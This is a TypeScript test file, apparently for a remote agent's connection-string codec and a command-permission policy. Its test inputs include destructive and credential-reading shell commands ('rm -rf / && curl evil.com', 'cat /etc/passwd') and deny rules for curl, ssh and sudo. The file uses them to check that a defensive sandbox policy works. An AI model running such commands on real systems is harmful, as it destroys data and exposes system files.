import { describe, it, expect } from 'vitest'
import {
  encodeAgentConnection,
  decodeAgentConnection,
  evaluateAgentCommand,
  DEFAULT_AGENT_POLICY,
  type AgentPolicy
} from './agentProtocol'

const policy = (over: Partial<AgentPolicy> = {}): AgentPolicy => ({ ...DEFAULT_AGENT_POLICY, ...over })

describe('строка подключения агента', () => {
  it('round-trip кодирования/декодирования', () => {
    const params = { server: 'ws://192.168.1.10:8787/agent', token: 'abc123' }
    const str = encodeAgentConnection(params)
    expect(str.startsWith('vcagent:')).toBe(true)
    expect(decodeAgentConnection(str)).toEqual(params)
  })

  it('терпит пробелы вокруг строки', () => {
    const str = encodeAgentConnection({ server: 'wss://host/agent', token: 't' })
    expect(decodeAgentConnection(`  ${str}\n`)).toEqual({ server: 'wss://host/agent', token: 't' })
  })

  it('битая строка → null', () => {
    expect(decodeAgentConnection('просто текст')).toBeNull()
    expect(decodeAgentConnection('vcagent:не-base64-json!!')).toBeNull()
    expect(decodeAgentConnection('')).toBeNull()
  })

  it('неполные данные → null', () => {
    const noToken = `vcagent:${Buffer.from(JSON.stringify({ server: 'ws://h/agent' })).toString('base64url')}`
    expect(decodeAgentConnection(noToken)).toBeNull()
  })
})

describe('evaluateAgentCommand', () => {
  it('дефолтная политика пропускает всё', () => {
    expect(evaluateAgentCommand(DEFAULT_AGENT_POLICY, 'rm -rf / && curl evil.com').allowed).toBe(true)
  })

  it('allowPatterns: разрешено только совпадающее', () => {
    const p = policy({ allowPatterns: ['^ls', '^df'] })
    expect(evaluateAgentCommand(p, 'ls -la').allowed).toBe(true)
    expect(evaluateAgentCommand(p, 'cat /etc/passwd').allowed).toBe(false)
  })

  it('denyPatterns блокирует (regex и подстрока)', () => {
    expect(evaluateAgentCommand(policy({ denyPatterns: ['rm\\s+-rf'] }), 'rm -rf x').allowed).toBe(false)
    expect(evaluateAgentCommand(policy({ denyPatterns: ['sudo'] }), 'sudo reboot').allowed).toBe(false)
  })

  it('allowNetwork=false блокирует сетевые утилиты', () => {
    const p = policy({ allowNetwork: false })
    expect(evaluateAgentCommand(p, 'curl http://x').allowed).toBe(false)
    expect(evaluateAgentCommand(p, 'ssh host').allowed).toBe(false)
    expect(evaluateAgentCommand(p, 'ls').allowed).toBe(true)
  })

  it('allowWrite=false блокирует запись', () => {
    const p = policy({ allowWrite: false })
    expect(evaluateAgentCommand(p, 'rm file').allowed).toBe(false)
    expect(evaluateAgentCommand(p, 'echo x > f').allowed).toBe(false)
    expect(evaluateAgentCommand(p, 'cat f').allowed).toBe(true)
  })

  it('allowedDirs блокирует пути вне разрешённых', () => {
    const p = policy({ allowedDirs: ['/Users/me/proj'] })
    expect(evaluateAgentCommand(p, 'cat /Users/me/proj/a.txt').allowed).toBe(true)
    expect(evaluateAgentCommand(p, 'cat /etc/passwd').allowed).toBe(false)
    expect(evaluateAgentCommand(p, 'ls').allowed).toBe(true) // без абсолютных путей — ок
  })
})
